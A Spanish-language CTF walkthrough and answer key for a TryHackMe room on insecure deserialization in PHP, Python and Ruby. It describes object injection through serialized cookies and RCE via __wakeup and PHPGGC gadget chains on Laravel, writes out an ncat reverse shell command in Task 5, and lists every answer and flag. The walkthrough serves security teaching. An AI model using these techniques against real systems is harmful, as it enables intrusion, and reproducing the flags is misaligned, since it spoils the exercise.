# Insecure Deserialisation

| Dificultad | Tipo | Slug | Link | Sección | Fuente | Componentes | Impacto |
|-----------|------|------|------|--------|--------|-------------|---------|
| Medium | Web / Deserialización | insecuredeserialisation | https://tryhackme.com/room/insecuredeserialisation | 02 Level Medium | TryHackMe | PHP serialize/unserialize, Python pickle, Ruby Marshal, Flask, Laravel, PHPGGC | RCE / toma de control |

---

**Contexto:** La deserialización insegura ocurre cuando una aplicación confía en datos serializados sin validar su integridad y origen, permitiendo manipular objetos para lograr **RCE**, escalada o DoS (OWASP A8:2017 → A08:2021). La sala recorre la serialización en **PHP** (`serialize()`/`unserialize()`, métodos mágicos como `__wakeup`/`__toString`), **Python** (`pickle` + Base64) y **Ruby** (`Marshal`), la identificación de formatos por sus firmas (`O:8:"`, `TzoxMzo`), la explotación de **object injection** en una app de notas (flag por suscripción), RCE con reverse shell vía `__wakeup`, y una app vulnerable de **Laravel** explotada con **PHPGGC** (vector `__toString`) hasta root.

## Solucionario

### Task 1: Introducción a la serialización en PHP
**Explicación:**

La serialización transforma el estado de un objeto en un byte stream almacenable/transmisible; en PHP se realiza con `serialize()`. Se identifica además el **CVE-2015-4852** (deserialización insegura en Apache Commons Collections) y su puntuación **CVSS base**.

1. Función de serialización en PHP: `serialize()`
2. Puntuación base de CVE-2015-4852: `7.5`
3. ¿La serialización solo permite guardar en un archivo byte stream? `nay`

### Task 2: Formatos de serialización
**Explicación:**

Se comparan los formatos por lenguaje. En **Python** se usa el módulo **pickle** (a menudo con Base64 para transmisión segura); en **Ruby** el módulo binario renombrado es **Marshal**. En la app de notas Python (`http://MACHINE_IP:5000`) se obtiene el Base64 del pickle de la cadena `You got it`; en PHP se obtiene su representación serializada.

1. Base64 tras pickling de `You got it` (Python): `gASVNQAAAAAAAACMCF9fbWFpbl9flIwFTm90ZXOUk5QpgZR9lIwFbm90ZXOUXZSMCllvdSBnb3QgaXSUYXNiLg==`
2. Salida serializada de `You got it` (PHP): `O:5:"Notes":1:{s:7:"content";s:10:"You got it";}`
3. Módulo de serialización binaria en Ruby: `Marshal`

### Task 3: Identificación
**Explicación:**

Se visita `http://MACHINE_IP/who/index.php`, que muestra el código fuente con la función de serialización definida por el usuario: **HelloTHMSerialization**.

Respuesta: `HelloTHMSerialization`

### Task 4: Object injection (flag de suscripción)
**Explicación:**

En la app de notas, la cookie contiene un objeto serializado (`TzoxMzo...` → Base64 → `O:8:"` en PHP). El rol por defecto del usuario es `guest`; modificando el objeto serializado (por ejemplo el booleano `isSubscribed` de `b:0` a `b:1`) y reinyectándolo, se comparte una nota con suscripción válida y se obtiene la flag.

1. Flag al compartir una nota con suscripción válida: `THM{10101}`
2. Rol por defecto al cargar la app de notas: `guest`

### Task 5: Explotación con reverse shell (RCE)
**Explicación:**

En `case2` (`index.php`) el parámetro `decode` pasa por `base64_decode()` + `unserialize()`. Se genera un objeto de la clase `MaliciousUserData` cuyo método `__wakeup()` ejecuta un comando (`ncat -nv <IP> 4444 -e /bin/sh`); el payload Base64 se envía por la URL, se recibe la shell y se leen los datos y la flag.

1. Flag tras obtener la reverse shell: `THM{GOT_THE_SH#LL}`
2. Salida de `whoami` tras la shell: `www-data`

### Task 6: Cadena PHPGGC en Laravel
**Explicación:**

Se identifica el gadget chain de **PHPGGC** para CodeIgniter4/FR1 y el vector de explotación asociado. Sobre la aplicación Laravel vulnerable se consigue RCE como root y se ejecuta `uname -r` para conocer el kernel.

1. Vector para explotar CodeIgniter4/FR1 según PHPGGC: `__toString`
2. Salida de `whoami` en la app Laravel vulnerable: `root`
3. Salida de `uname -r` en la app Laravel vulnerable: `5.15.0-1075-aws`

### Task 7: Buenas prácticas
**Explicación:**

Se responde a la pregunta de si es buena práctica usar `eval()` a ciegas en el código: la respuesta es negativa.

Respuesta: `nay`

### Task 8: Cierre
**Explicación:**

Se consolidan las mitigaciones: no deserializar entrada no confiable, usar formatos seguros (JSON), firmar los datos (HMAC) y evitar métodos mágicos peligrosos (`__wakeup`, `__destruct`) y `eval()`.

Respuesta: `No answer needed`

### Tabla de preguntas y respuestas

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1.1 | Función PHP de serialización | `serialize()` |
| 1.2 | Puntuación base de CVE-2015-4852 | `7.5` |
| 1.3 | ¿Solo byte stream? | `nay` |
| 2.1 | Base64 tras pickling en Python | `gASVNQAAAAAAAACMCF9fbWFpbl9flIwFTm90ZXOUk5QpgZR9lIwFbm90ZXOUXZSMCllvdSBnb3QgaXSUYXNiLg==` |
| 2.2 | Salida serializada en PHP | `O:5:"Notes":1:{s:7:"content";s:10:"You got it";}` |
| 2.3 | Módulo binario en Ruby | `Marshal` |
| 3 | Función de serialización definida por el usuario | `HelloTHMSerialization` |
| 4.1 | Flag al compartir nota con suscripción | `THM{10101}` |
| 4.2 | Rol por defecto | `guest` |
| 5.1 | Flag tras reverse shell | `THM{GOT_THE_SH#LL}` |
| 5.2 | Salida de `whoami` tras la shell | `www-data` |
| 6.1 | Vector para CodeIgniter4/FR1 (PHPGGC) | `__toString` |
| 6.2 | Salida de `whoami` en Laravel | `root` |
| 6.3 | Salida de `uname -r` en Laravel | `5.15.0-1075-aws` |
| 7 | ¿Buena práctica usar eval() a ciegas? | `nay` |
| 8 | Tarea de cierre | `No answer needed` |

---

**Metodología:** Auditoría de deserialización por lenguaje: análisis de formatos (PHP `serialize`, Python `pickle`, Ruby `Marshal`), identificación de firmas, manipulación de cookies serializadas (object injection), generación de payloads con `__wakeup`/`__reduce__` para reverse shell, y explotación de gadget chains con **PHPGGC** sobre Laravel (vector `__toString`).

**Learning chain:** Fundamentos (`serialize`/CVSS) → formatos (pickle/Marshal) → firmas e identificación (`O:8:"`/`TzoxMzo`) → object injection (suscripción) → reverse shell (`__wakeup`) → PHPGGC en Laravel (`__toString`) → root → buenas prácticas.

**Lección:** *Nunca se debe deserializar entrada no confiable: el simple hecho de reconstruir un objeto puede disparar métodos mágicos que ejecutan código, y las gadget chains de librerías (Laravel/CodeIgniter/PHPGGC) convierten esa ejecución en root.*

**MITRE ATT&CK:** T1190 Exploit Public-Facing Application · T1059.006 Command and Scripting Interpreter · T1505.003 Web Shell · T1068 Exploitation for Privilege Escalation · T1078 Valid Accounts · T1552.001 Unsecured Credentials.

**Fuente:** [TryHackMe - Insecure Deserialisation](https://tryhackme.com/room/insecuredeserialisation)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.